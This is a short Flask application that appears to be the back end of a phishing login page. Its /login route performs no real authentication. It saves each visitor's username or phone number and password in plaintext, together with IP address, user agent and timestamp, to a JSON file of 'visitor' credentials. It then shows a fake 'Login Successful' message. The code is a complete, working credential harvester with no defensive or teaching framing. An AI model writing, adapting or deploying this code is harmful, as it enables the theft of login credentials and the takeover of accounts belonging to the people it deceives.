from flask import Flask, render_template, request, redirect, url_for
import json
import datetime
import os

app = Flask(__name__)

# Path to store credentials data
DATA_FILE = os.path.join('data', 'credentials.json')

# Ensure the data directory exists
os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)

@app.route('/')
def home():
    """Render the login page."""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission."""
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Collect form data
    username = request.form.get('username')
    phone = request.form.get('phone')
    password = request.form.get('password')
    login_method = request.form.get('loginMethod')

    # Prepare the data
    user_data = {
        "timestamp": timestamp,
        "ip": user_ip,
        "user_agent": user_agent,
        "login_method": login_method,
        "username": username if login_method == "username" else None,
        "phone": phone if login_method == "phone" else None,
        "password": password
    }

    # Save the data in the JSON file
    try:
        # Read existing data
        with open(DATA_FILE, 'r') as file:
            data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        data = {}

    # Add the new visitor's credentials
    visitor_id = f"visitor_{len(data) + 1}"
    data[visitor_id] = user_data

    # Write back the updated data
    with open(DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)

    # Redirect to success page
    return redirect(url_for('login_successful'))

@app.route('/login-successful')
def login_successful():
    """Render the login successful page."""
    return "<h1>Login Successful</h1><p>Thank you for logging in.</p>"

if __name__ == '__main__':
    app.run(debug=True)
